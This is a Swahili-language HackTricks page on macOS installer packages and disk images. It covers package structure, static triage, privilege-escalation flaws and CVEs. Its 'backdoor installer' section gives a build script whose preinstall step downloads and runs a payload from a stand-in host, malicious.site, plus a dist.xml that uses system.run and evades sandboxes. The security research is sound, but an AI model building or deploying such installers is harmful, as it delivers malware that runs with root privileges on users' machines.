# Matumizi Mabaya ya macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi za Pkg

**installer package** ya macOS (pia inajulikana kama faili ya `.pkg`) ni umbizo la faili linalotumiwa na macOS **kusambaza software**. Faili hizi ni kama **sanduku linalobeba kila kitu ambacho software** inahitaji ili kusakinishwa na kufanya kazi ipasavyo.

Faili ya package yenyewe ni archive inayohifadhi **hierarchy ya mafaili na directories zitakazosakinishwa kwenye** kompyuta **lengwa**. Inaweza pia kujumuisha **scripts** za kutekeleza kazi kabla na baada ya usakinishaji, kama vile kusanidi mafaili ya configuration au kusafisha matoleo ya zamani ya software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) na ukaguzi wa scripts/installation
- **PackageInfo (xml)**: Taarifa, mahitaji ya usakinishaji, eneo la usakinishaji, paths za scripts za kuendesha
- **Bill of materials (bom)**: Orodha ya mafaili ya kusakinisha, kusasisha au kuondoa pamoja na file permissions
- **Payload (CPIO archive gzip compressed)**: Mafaili ya kusakinisha kwenye `install-location` kutoka PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Scripts za usakinishaji kabla na baada ya usakinishaji pamoja na resources nyingine zinazotolewa kwenye temp directory kwa ajili ya execution.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Ili kuweza kuona yaliyomo kwenye installer bila ku-decompress mwenyewe, unaweza pia kutumia tool ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Njia fupi za static triage

Ikiwa lengo ni kufanya analysis, jaribu **kuepuka kufungua package kwa `Installer.app` kwanza**. Baadhi ya packages zinaweza ku-execute code mara tu Installer inapozifungua (kwa mfano kupitia `system.run()` au installer plug-ins), hivyo offline extraction kwa kawaida ndiyo mwanzo salama zaidi.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Maelezo ya Msingi kuhusu DMG

Faili za DMG, au Apple Disk Images, ni muundo wa faili unaotumiwa na Apple macOS kwa disk images. Faili ya DMG kimsingi ni **disk image inayoweza ku-mount** (ina filesystem yake) iliyo na data ghafi ya block ambayo kwa kawaida imebanwa na wakati mwingine imesimbwa. Unapofungua faili ya DMG, macOS **hu-mount kama diski ya kawaida**, hivyo kukuruhusu kufikia yaliyomo.

> [!CAUTION]
> Kumbuka kwamba installers za **`.dmg`** zinaunga mkono **formats** nyingi sana hivi kwamba hapo awali baadhi yake zilizokuwa na vulnerabilities zilitumiwa kupata **kernel code execution**.

### Hierarkia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarkia ya faili ya DMG inaweza kutofautiana kulingana na maudhui. Hata hivyo, kwa application DMGs, kwa kawaida hufuata muundo huu:

- Kiwango cha Juu: Hii ni root ya disk image. Mara nyingi huwa na application na huenda ikawa na link ya Applications folder.
- Application (.app): Hii ndiyo application halisi. Katika macOS, application kwa kawaida ni package iliyo na faili na folda nyingi binafsi zinazounda application hiyo.
- Applications Link: Hii ni shortcut ya Applications folder katika macOS. Lengo lake ni kurahisisha kusakinisha application. Unaweza kuburuta faili ya .app hadi kwenye shortcut hii ili kusakinisha app.

## Privesc kupitia pkg abuse

### Execution kutoka public directories

Ikiwa pre au post installation script, kwa mfano, inatekelezwa kutoka **`/var/tmp/Installerutil`**, na attacker anaweza kudhibiti script hiyo, anaweza kufanya privilege escalation kila inapotekelezwa. Au mfano mwingine unaofanana:<sup>[[1]](#references)[[3]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Hii ni [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) ambayo installers na updaters kadhaa huiita ili **execute kitu kama root**. Function hii hupokea **path** ya **file** ya **execute** kama parameter, hata hivyo, ikiwa attacker angeweza **modify** faili hii, angeweza **abuse** execution yake yenye root ili **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Kwa maelezo zaidi tazama talk hii: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Matumizi mabaya ya Environment na shebang

Bugs za kisasa za PackageKit zilionyesha kuwa installer scripts mara nyingi hutekelezwa kama **trusted root code**, huku zikiendelea kuweka attacker-controlled context karibu. Unapofanya auditing ya vendor packages, zingatia hasa:

- Shell interpreters kama `#!/bin/zsh` / `#!/bin/bash`
- Calls kama `sudo -u $USER`, `launchctl asuser`, au logic yoyote inayotegemea `$USER`, `$HOME`, `PATH`, `TMPDIR`, au relative paths
- Non-shell interpreters ambazo zinaweza kupakia init files au libraries zinazodhibitiwa na user
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Kwa 2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance wakati wa installs zilizoanzishwa na user), angalia [ukurasa wa generic macOS privesc](../macos-privilege-escalation.md). Ikiwa package ni **Apple-signed**, bug hiyo hiyo ya script inaweza kuwa **SIP/TCC-relevant** kwa sababu `system_installd` inaweza kubeba `com.apple.rootless.install.heritable`; angalia [ukurasa wa SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)[[6]](#references)</sup>

### Execution kwa kutumia mounting

Ikiwa installer inaandika kwenye `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` kwa kutumia noowners, ili uweze **kubadilisha file yoyote wakati wa installation** na kutumia vibaya mchakato wa installation.

Mfano wa hili ni **CVE-2021-26089**, ambayo iliweza **ku-overwrite periodic script** na kupata execution kama root. Kwa maelezo zaidi, angalia talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg kama malware

### Empty Payload

Inawezekana ku-generate faili ya **`.pkg`** yenye **pre na post-install scripts** bila payload halisi, isipokuwa malware iliyo ndani ya scripts.

### JS katika Distribution xml

Inawezekana kuongeza tags za **`<script>`** kwenye faili ya **distribution xml** ya package, na code hiyo ita-execute na inaweza **ku-execute commands** kwa kutumia **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Katika distribution packages, hii kwa kawaida hutegemea faili ya kiwango cha juu `Distribution` kuwezesha external scripts, kwa mfano kwa kutumia `allow-external-scripts="true"`. Kwa hiyo, kukagua `preinstall` / `postinstall` pekee hakutoshi: **Distribution XML yenyewe** inaweza kuwa na `installation-check` / `volume-check` hooks na execution paths za moja kwa moja za `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer yenye Backdoor

Installer hasidi inayotumia script na msimbo wa JS ndani ya dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Marejeleo

- [1] [DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
